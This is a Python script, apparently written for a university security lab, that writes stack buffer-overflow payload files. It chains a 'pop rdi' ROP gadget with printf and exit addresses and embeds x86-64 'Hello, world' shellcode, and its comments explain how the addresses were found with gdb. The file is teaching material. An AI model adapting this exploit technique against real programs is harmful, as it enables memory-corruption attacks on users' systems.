#edited by shaun yee 1001531 15/3/2018 for Security Lab 5. 

#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016


from struct import pack
lenfill = 64 

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. pwnlib is used to turn int to string
#this is not used for payload2. 
storedRBP = pack('<Q',0x4444444444444444) # DDDDDDDD in hex

# gadget address
gadget = pack('<Q',0x7ffff7b4c87a) # this is the address of the gadget, found using ropsearch "pop rdi" libc and choosing a random address


#address of the string hello world - set break point right before printstatement, can see the address of string hello world
stringAD_gdb = pack('<Q', 0x7fffffffe5c8)

#SHELL address for string 
#found using by breaking the code, causing core dump. Found by analyzing the RIP value, finding out where it was pointing in the stack, then adding the correct number of bytes to the address to run the string address.
#eg. adding one char the offset, found that the RIP pointed to the gadget address with one offset. Added 32 to the RIP address found, and reached the hello world string. 
stringAD_shell = pack('<Q',0x7fffffffe608)

#printf Address that was found using p printf
printf = pack('<Q', 0x7ffff7a62800)

#exit address, found by using p exit
exit = pack('<Q', 0x7ffff7a47030)

with open('payloadgdb2','wb') as f:
    f.write(b'A' * lenfill+b'dddddddd'+gadget+stringAD_gdb+printf+exit+b'hello world'+b'\n')

with open('payload2','wb') as f:
    f.write(b'A' * lenfill+b'dddddddd'+gadget+stringAD_shell+printf+exit+b'hello world'+b'\n')

